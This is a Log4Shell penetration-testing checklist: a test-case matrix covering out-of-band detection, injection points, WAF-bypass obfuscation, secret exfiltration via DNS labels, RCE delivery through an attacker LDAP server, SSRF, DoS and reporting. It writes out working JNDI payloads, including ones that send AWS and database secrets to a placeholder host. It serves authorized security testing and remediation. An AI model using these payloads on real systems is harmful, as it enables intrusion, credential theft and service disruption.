# JNDI / Log4Shell — Checklist

Expert per-attack **test-case matrix** for JNDI / Log4Shell — in testing order, impact-first. All columns preserved (where to inject, steps, expected, payload, impact, severity, CVSS, tools, refs).

*13 test cases · spreadsheet grid — scroll sideways for all 12 columns.*

| Operation | Test Case Name | Test Category | Where to Test / Injection Point | Test Steps | Expected Result | Payload Example | Impact | Severity | CVSS | Tools | References |
|---|---|---|---|---|---|---|---|---|---|---|---|
| JNDI-001 | Stand up OOB + confirm Java stack + map logged inputs | Recon &amp; OOB Setup | Whole app, before any payload | 1. Bring up your OOB (interactsh / Burp Collaborator) with DNS + LDAP/RMI capture ready - this is the oracle.<br>2. Confirm the stack is Java: error pages, JSESSIONID, Spring whitelabel, .jsp/.do, Server header, fingerprint.<br>3. List candidate LOGGED inputs: headers, params, body, username, filename, path (404s get logged). | OOB is live and a list of Java-logged candidate inputs exists. | <code>interactsh-client ; JSESSIONID + Spring whitelabel confirm Java ; log candidates: UA, XFF, username</code> | No OOB = no way to prove blind RCE; wrong stack = wasted effort. | Info | 0.0 (N/A) | interactsh-client, Burp Collaborator, httpx | CWE-917; OWASP: Log4Shell (CVE-2021-44228) |
| JNDI-002 | Canary spray into every header (per-input token) | Detect — Blind OOB | User-Agent, X-Forwarded-For, Referer, Authorization, custom X-&#42; headers | 1. Fire ${jndi:ldap://TOKEN.$COLLAB/a} into EVERY header, each with a DISTINCT token so a callback names the exact input.<br>2. Watch the OOB for a DNS/LDAP hit from the TARGET egress IP carrying your token.<br>3. Confirm the source is the target (IP+timing), not your resolver / a scanner sandbox. | A target-sourced DNS/LDAP callback carries your per-header token. | <code>User-Agent: ${jndi:ldap://ua-TOKEN.$COLLAB/a} ; X-Forwarded-For: ${jndi:ldap://xff-TOKEN.$COLLAB/a}</code> | A target-sourced callback = blind unauthenticated RCE = Critical (10.0). | Critical | 10.0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H) | poc/jndi_probe.py, interactsh, log4j-scan | CWE-917; NVD CVE-2021-44228 (Log4Shell) |
| JNDI-003 | Canary spray into params / JSON / username / filename / path | Detect — Blind OOB | Every query/body param, JSON value AND key, login username, filename, request path | 1. Fire the canary into every param, JSON value and key, login username, filename, and the request path.<br>2. Distinct per-input token each time.<br>3. Include indirect sinks: values stored then logged by a back-office worker / admin panel. | A callback identifies which non-header input reached the logger. | <code>{"user":"${jndi:ldap://user-TOKEN.$COLLAB/a}"} ; /${jndi:ldap://path-TOKEN.$COLLAB/a}</code> | Blind RCE via any logged input - Critical (10.0). Second-order sinks are easily missed. | Critical | 10.0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H) | poc/jndi_probe.py, interactsh | CWE-917; HackTricks: JNDI - Java Naming and Directory Interface &amp; Log4Shell |
| JNDI-004 | DNS-protocol canary (egress-filter survival) | Detect — Blind OOB | Same inputs, where LDAP egress may be blocked | 1. Use ${jndi:dns://TOKEN.$COLLAB/a} - DNS survives most egress filtering and is stealthiest.<br>2. A DNS hit alone proves lookups resolve (&gt;= partial vuln).<br>3. Prefer dns:// where egress is tight. | A DNS callback confirms the lookup resolves even when LDAP is filtered. | <code>${jndi:dns://TOKEN.$COLLAB/a}</code> | Confirms JNDI evaluation even behind tight egress - the least-intrusive conclusive proof. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | interactsh (DNS) | CWE-917; NVD CVE-2021-44228 (Log4Shell) |
| JNDI-005 | WAF bypass — nested-lookup obfuscation | Evade — WAF/Filter | Inputs where raw ${jndi:} is blocked | 1. Log4j resolves nested ${}: ${${lower:j}ndi:ldap://TOKEN.$COLLAB/a}.<br>2. ${::-X} yields literal X: ${${::-j}${::-n}${::-d}${::-i}:...}.<br>3. Rebuild both jndi AND ldap from sub-lookups; URL-encode; split across two headers the app concatenates; mix ldap/dns. | The obfuscated payload evaluates and calls back despite the WAF. | <code>${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://TOKEN.$COLLAB/a} ; ${${::-j}${::-n}${::-d}${::-i}:...}</code> | Restores Log4Shell against signature WAFs - proves the filter is not a fix. Critical. | Critical | 10.0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H) | poc/payload_gen.py, Burp | CWE-917; HackTricks: JNDI - Java Naming and Directory Interface &amp; Log4Shell |
| JNDI-006 | Secret / env-var exfiltration (no RCE needed; works on 2.15) | Impact — Data Theft | Confirmed lookup resolution | 1. Embed an env/sys var as the DNS label: ${jndi:dns://${env:AWS_SECRET_ACCESS_KEY}.$COLLAB/a}.<br>2. Also DB_PASSWORD, ${sys:user.name}, ${env:HOSTNAME}, KUBERNETES_SERVICE_HOST.<br>3. The resolved value arrives as a DNS label at your OOB (base32/hex if it has invalid chars; split long values). Confirm the label is NON-EMPTY. | The secret's value arrives as a DNS label at your OOB. | <code>${jndi:dns://${env:AWS_SECRET_ACCESS_KEY}.$COLLAB/a} ; ${jndi:ldap://${env:DB_PASSWORD}.$COLLAB/a}</code> | Cloud/DB credential exfiltration even where RCE is mitigated (Log4j 2.15) - Critical. | Critical | 9.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N) | interactsh (DNS), poc/payload_gen.py | CWE-917; CWE-200; HackTricks: JNDI - Java Naming and Directory Interface &amp; Log4Shell |
| JNDI-007 | Version / JVM fingerprint via lookups | Impact — Fingerprint | Confirmed lookup resolution | 1. ${jndi:dns://ver-${sys:java.version}.$COLLAB/a} -&gt; JDK version decides the RCE technique (pre/post Oct-2018 trustURLCodebase).<br>2. ${jndi:dns://os-${sys:os.name}.$COLLAB/a}.<br>3. A correct value returning confirms lookups resolve and selects technique A/B/C. | The JVM/OS version arrives as a DNS label, selecting the exploit technique. | <code>${jndi:dns://ver-${sys:java.version}.$COLLAB/a} ; ${jndi:dns://os-${sys:os.name}.$COLLAB/a}</code> | Determines the JVM state and thus which RCE path is viable - drives escalation. | Info | 0.0 (N/A) | interactsh | CWE-917; HackTricks: JNDI - Java Naming and Directory Interface &amp; Log4Shell |
| JNDI-008 | RCE delivery — technique A/B/C (authorized only) | Impact — RCE | Confirmed callback; AUTHORIZED engagement/lab | 1. A (remote codebase, old JVM trustURLCodebase=true): marshalsec LDAPRefServer + host Exploit.class -&gt; ${jndi:ldap://$ATTACKER:1389/Exploit}.<br>2. B (serialized gadget, bypasses trustURLCodebase): marshalsec + ysoserial CC5/6 as javaSerializedData.<br>3. C (BeanFactory/EL local bypass, modern JVM): JNDI-Injection-Exploit / rogue-jndi auto-select.<br>4. Prove ONE benign command (id/hostname), then STOP. Tear down servers. | A benign command executes on the target via the matched JNDI technique. | <code>${jndi:ldap://$ATTACKER:1389/Exploit} (A) ; marshalsec+ysoserial (B) ; rogue-jndi (C) -&gt; id</code> | Full unauthenticated RCE proven - Critical (10.0). | Critical | 10.0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H) | marshalsec, ysoserial, rogue-jndi, JNDI-Injection-Exploit | CWE-917; CWE-502; NVD CVE-2021-44228 (Log4Shell) |
| JNDI-009 | SSRF angle via JNDI lookup | Impact — SSRF | JNDI lookup that reaches internal hosts / metadata | 1. Point the lookup at internal/metadata: ${jndi:ldap://169.254.169.254/...} / internal host:port.<br>2. Where RCE is mitigated, the lookup still proves internal reachability.<br>3. Hand to the SSRF kit for metadata-&gt;creds. | The lookup reaches an internal host / cloud metadata endpoint. | <code>${jndi:ldap://169.254.169.254:80/a} ; ${jndi:ldap://internal-svc:8080/a}</code> | SSRF -&gt; internal reach / cloud metadata even without RCE - Medium/High. | High | 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) | SSRFmap, interactsh | CWE-917; CWE-918; HackTricks: JNDI - Java Naming and Directory Interface &amp; Log4Shell |
| JNDI-010 | DoS — recursive lookup (CVE-2021-45105) | Impact — DoS | Log4j 2.x &lt; 2.17; AUTHORIZE first | 1. Self-referential recursion: ${${::-${::-$${::-:}}}} -&gt; StackOverflow.<br>2. Prove reproducibility WITH authorization only.<br>3. Never crash prod for real users. | A recursive lookup causes a StackOverflow / thread hang. | <code>${${::-${::-$${::-:}}}}</code> | Availability impact (CVE-2021-45105) - Medium/High (scope required). | Medium | 5.9 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H) | manual | CWE-917; CWE-674; Log4j CVE-2021-45105; NVD CVE-2021-44228 (Log4Shell) |
| JNDI-011 | Map the CVE chain &amp; non-Log4j JNDI sinks; distinguish | Product-Specific | Log4j version + other JNDI-using products | 1. Map to the Log4j chain (44228 / 45046 / 45105 / 44832) or a non-Log4j sink.<br>2. Check H2 console, Logback JNDI config, Solr/Druid/Struts, Spring JDBCAppender.<br>3. Confirm it is JNDI injection, NOT LDAP-filter injection / plain deserialization / SpEL / Spring4Shell. | The exact CVE/sink is identified and mislabels are ruled out. | <code>Log4j 2.14 -&gt; CVE-2021-44228 ; H2 console JNDI ; Logback config JNDI</code> | Correct CVE attribution + ruling out look-alikes = an accurate, defensible report. | Info | 0.0 (N/A) | nuclei -tags log4j,jndi | CWE-917; Log4j CVE-2021-44228/45046/45105/44832; NVD CVE-2021-44228 (Log4Shell) |
| JNDI-012 | False-positive filter / auto-reject | Validation &amp; Reporting | Before reporting any candidate | 1. REJECT: ${jndi:} merely reflected with NO callback; a scanner 'log4j detected'/version banner with no target callback; a DNS hit from YOUR resolver / a CDN / a proxy (not target egress); a callback from an AV/scanner sandbox detonating the payload; ${env:X} exfil where the arriving label is EMPTY; a DoS that only crashed your local test.<br>2. REQUIRE: a target-sourced OOB callback carrying your token. | Only target-sourced, token-carrying callbacks survive. | <code>reflected ${jndi:} = not a finding ; scanner banner = reproduce with your OOB ; empty ${env} label = var not set</code> | Protects credibility; Log4Shell is dense with reflection-only / scanner-banner false positives. | Info | 0.0 (N/A) | manual | CWE-917; PortSwigger Research: Log4Shell / JNDI |
| JNDI-013 | Client-facing impact &amp; SAFE-PoC package | Validation &amp; Reporting | Confirmed finding, pre-submission | 1. Lead with impact: unauthenticated RCE (10.0) / credential exfil.<br>2. Provide the payload, the named input, and the target-sourced OOB callback carrying your token (+ optionally one benign command or one ${env} leak).<br>3. Set CVSS (10.0 unauth RCE) + CWE-917 (+ CWE-502 for the gadget path). Remediation: upgrade to Log4j 2.17.1+, remove JndiLookup.class, set log4j2.formatMsgNoLookups/trustURLCodebase=false, egress-filter LDAP/RMI/DNS.<br>4. Own OOB, per-input tokens, one benign proof then STOP, no shells/persistence, tear down exploit servers; de-dupe to one sink. | A reproducible, correctly-rated, safe PoC with clear remediation. | <code>PoC: payload + named input + target-sourced callback with token + CVSS 10.0 + CWE-917 + remediation.</code> | Converts the callback into a defensible Critical (10.0) report at the right severity. | Info | 0.0 (N/A) | CVSS calculator, JNDI_REPORT_TEMPLATE.md | CWE-917; CWE-502; FIRST CVSS v3.1; NVD CVE-2021-44228 (Log4Shell)  &#124;  TOP REFERENCES: LunaSec/Veracode Log4Shell writeups; Alvaro Munoz &amp; pwntester JNDI research (BlackHat); PortSwigger Research; NVD CVE-2021-44228 |
